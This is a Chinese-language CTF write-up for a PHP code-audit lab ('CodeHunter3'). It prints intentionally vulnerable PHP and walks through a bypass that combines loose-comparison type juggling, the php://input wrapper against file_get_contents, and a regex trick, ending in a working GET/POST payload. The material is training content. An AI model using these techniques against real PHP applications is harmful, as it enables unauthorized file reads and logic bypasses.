# 0x00 前言
好靶场是一个国内唯一一家以真实SRC报告制作靶场的网络安全靶场平台。现在推出了PHP代码审计靶场，快来玩吧。

[https://github.com/haobachang-1/haobachangBlog/blob/main/README.md](https://github.com/haobachang-1/haobachangBlog/blob/main/README.md)

# 0x00 使用方式  

靶场名称：PHP代码审计CodeHunter3

# ![](https://cdn.nlark.com/yuque/0/2025/png/50745682/1758249400547-7e808dcc-0fc1-4db9-a709-21d3e82d8366.png)
![](https://cdn.nlark.com/yuque/0/2025/png/50745682/1758249470220-f760f082-b6d8-4637-a835-4756c0254086.png)

# 0x01解题
![](https://cdn.nlark.com/yuque/0/2025/png/50745682/1758249595795-12d30dc5-82ee-49c3-aecd-3e20280985bb.png)

```plain
1if(!$_GET['id'])
2{
3	header('Location: run.php?id=1');
4	exit();
5}
6$id=$_GET['id'];
7$a=$_GET['a'];
8$b=$_GET['b'];
9if(stripos($a,'.'))
10{
11 echo 'Hahahahahaha';
12 return ;
13}
14$data = @file_get_contents($a,'r');
15if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
16{
17 echo $flag;
18} 
```



分析代码，涉及到id,a和b三个参数，我们分别来看。

针对于参数id，由于关键代码部分给出如下，我们可以看出，一旦id的参数为假值(空、0、null)，就会重定向到 **id=1** 。

```plain
if(!$_GET['id']) {
    header('Location: run.php?id=1');
    exit();
}
```

但是呢，后面又发现要求id=0，这两个其实是互相矛盾的，所以我们必须要绕过上述if中的判断，同时让下面的$id == 0成立，我们需要一个值，既不能被上面的函数判断为假(不能是 '0' 或 '')，又必须让下面值为 true。

```plain
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
16{
17 echo $flag;
18}
```

所以，此处考虑传一个字符串，它以非数字字符开头，但在弱比较中被转为 0

```plain
?id=abc
```

再来看参数a，`$a` 是用户输入的，`file_get_contents($a)` 会读取文件或 URL。

```plain
$data = @file_get_contents($a, 'r');
```

此处提示是伪协议了，所以我们直接往这方面去考虑，这里还有一点就是前面对. 进行了拦截

```plain
if(stripos($a,'.')) {
    echo 'Hahahahahaha';
    return;
}
```

所以我们必须使用不带点的伪协议，这里就有两个选择了，`php://input` 和 `php://temp`

因为input是可以配合post参数，所以这里选择`$a = 'php://input'` 以及`post 1112 is a nice lab!`

最后看b，针对于b的要求有以下几个：

简单，长度大于 5 即可。

```plain
strlen($b) > 5
```

eregi 是 不区分大小写的正则匹配，已废弃，但仍可用

```plain
eregi("111".substr($b,0,1), "1114")
```

它的主要作用是构造一个正则 `"111X"`，看是否能匹配字符串` "1114" substr($b,0,1)` 是 `$b `的第一个字符

但是注意后面，即此处`$b[0] == '4'`

```plain
substr($b,0,1)!=4
```

所以可以让`$b[0] == '.'`，那么正则是 `'/111./i'`，可以匹配 `"1114"`。所以只要 `$b` 的第一个字符是` .`，就能满足这个条件 并且 `strlen($b) > 5`，所以 `$b` 可以是：`.xxxxx`（总长度 >5）

最后总结(答案不唯一)：

get部分为：

```plain
id=abc&a=php://input&b=.12345
```

post部分为：

```plain
1112 is a nice lab!
```

可获取flag。

![](https://cdn.nlark.com/yuque/0/2025/png/50745682/1758249271659-967b0be8-b2a6-491b-9203-9369b7861158.png)

